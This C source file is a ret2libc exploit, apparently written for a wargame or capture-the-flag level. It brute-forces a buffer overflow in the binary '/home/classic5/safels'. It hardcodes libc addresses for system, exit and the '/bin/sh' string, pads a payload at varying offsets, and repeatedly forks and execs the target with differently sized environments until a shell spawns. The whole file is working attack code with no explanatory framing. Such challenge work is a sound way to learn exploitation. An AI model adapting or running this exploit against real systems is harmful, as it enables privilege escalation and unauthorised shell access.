#include <unistd.h>
#include <string.h>
#include <stdio.h>


int main()
{
    char system_libc[5] = "\x80\x1e\xe9\xf7";
    char bin_sh_libc[5] = "\x91\x1d\xf8\xf7";
    char exit_libc[5] = "\x50\x4c\xe8\xf7";

    char arg[300];
    char* arge[2] = {arg,NULL};

    int size_arge = 0;
    for(;size_arge<256;size_arge+=16)
    {
        int offset = 1;
        for(;offset<12;offset++)
        {
            char payload[150];
            payload[0] = 0;
            int i=0;
            for(;i<offset;i++)
                strcat(payload,"A");
            for(i=0;i<7;i++)
            {
                strcat(payload,system_libc);
                strcat(payload,exit_libc);
                strcat(payload,bin_sh_libc);
            }
            for(i=0;i<15-offset;i++)
                strcat(payload,"A");
            strcat(payload,";");

            int id = fork();

            if(id<0)
            {
                printf("Error forking\n");
                return -1;
            }
            else if(id)
            {
                wait(NULL);
            }
            else
            {
                memset(arg,'A',size_arge);
                arg[size_arge] = 0;
                char* argv[] = {"/home/classic5/safels",payload,NULL};
                if(execve("/home/classic5/safels",argv,arge)<0)
                {
                    printf("Error exec\n");
                    return -1;
                }
            }
        }
    }
    return 0;
}
